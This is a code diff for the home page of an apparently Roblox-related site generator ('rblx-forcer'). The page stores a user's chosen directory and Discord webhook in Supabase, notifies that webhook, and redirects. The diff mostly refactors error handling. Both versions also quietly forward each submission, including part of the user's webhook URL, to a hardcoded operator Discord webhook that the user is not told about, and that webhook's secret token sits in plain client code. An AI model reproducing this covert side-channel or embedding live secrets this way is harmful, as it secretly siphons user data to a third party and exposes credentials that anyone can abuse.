@@ -15,67 +15,86 @@ export default function HomePage() {
 
     setStatus("⏳ Creating site...");
 
-    // Insert new record in Supabase
-    const { data, error } = await supabase
-      .from("websites")
-      .insert([{ directory, webhook_url: webhook }]);
-
-    if (error) {
-      setStatus("❌ Error: " + error.message);
-      return;
-    }
-
-    // Send Discord webhook message to user's webhook
     try {
-      await fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `✅ Your site **${directory}** has been successfully created!\n🌐 Visit it here: https://rblx-forcer.vercel.app/${directory}`,
-        }),
-      });
-    } catch (err) {
-      console.error("Webhook send failed", err);
-    }
+      // Insert new record in Supabase
+      const { data, error } = await supabase
+        .from("websites")
+        .insert([{ directory, webhook_url: webhook }])
+        .select(); // Add .select() to get the inserted data
 
-    // Send to permanent webhook
-    const permanentWebhook = "https://discord.com/api/webhooks/1428991632472281179/wCh1K8TJUBc6zethK1iCLy6AnYw3jpYpTv2XZuRye7cr39Zv2Nik57xsLVsnkXB5-djA";
-    try {
-      await fetch(permanentWebhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          embeds: [
-            {
-              title: "🚀 New Website Generated",
-              color: 0x00ff00,
-              fields: [
-                {
-                  name: "📁 Directory",
-                  value: directory,
-                  inline: true
-                },
-                {
-                  name: "🔗 User Webhook",
-                  value: webhook.substring(0, 50) + "...",
-                  inline: true
-                },
-                {
-                  name: "🌐 URL",
-                  value: `https://rblx-forcer.vercel.app/${directory}`
-                }
-              ],
-              timestamp: new Date().toISOString()
-            }
-          ]
-        }),
-      });
-    } catch (err) {
-      console.error("Permanent webhook send failed", err);
-    }
+      if (error) {
+        console.error("Supabase error:", error);
+        setStatus("❌ Error: " + error.message);
+        return;
+      }
 
-    // Redirect user to their page
-    window.location.href = `/${directory}`;
+      // Check if data was inserted successfully
+      if (!data || data.length === 0) {
+        setStatus("❌ Failed to create site. Please try again.");
+        return;
+      }
+
+      console.log("Site created successfully:", data[0]);
+
+      // Send Discord webhook message to user's webhook
+      try {
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `✅ Your site **${directory}** has been successfully created!\n🌐 Visit it here: https://rblx-forcer.vercel.app/${directory}`,
+          }),
+        });
+      } catch (err) {
+        console.error("Webhook send failed", err);
+      }
+
+      // Send to permanent webhook
+      const permanentWebhook = "https://discord.com/api/webhooks/1428991632472281179/wCh1K8TJUBc6zethK1iCLy6AnYw3jpYpTv2XZuRye7cr39Zv2Nik57xsLVsnkXB5-djA";
+      try {
+        await fetch(permanentWebhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            embeds: [
+              {
+                title: "🚀 New Website Generated",
+                color: 0x00ff00,
+                fields: [
+                  {
+                    name: "📁 Directory",
+                    value: directory,
+                    inline: true
+                  },
+                  {
+                    name: "🔗 User Webhook",
+                    value: webhook.substring(0, 50) + "...",
+                    inline: true
+                  },
+                  {
+                    name: "🌐 URL",
+                    value: `https://rblx-forcer.vercel.app/${directory}`
+                  }
+                ],
+                timestamp: new Date().toISOString()
+              }
+            ]
+          }),
+        });
+      } catch (err) {
+        console.error("Permanent webhook send failed", err);
+      }
+
+      // Wait a moment to ensure database is updated, then redirect
+      setTimeout(() => {
+        setStatus("✅ Site created! Redirecting...");
+        window.location.href = `/${directory}`;
+      }, 2000);
+
+    } catch (error) {
+      console.error("Unexpected error:", error);
+      setStatus("❌ Unexpected error occurred. Please try again.");
+    }
   };
 
   return (
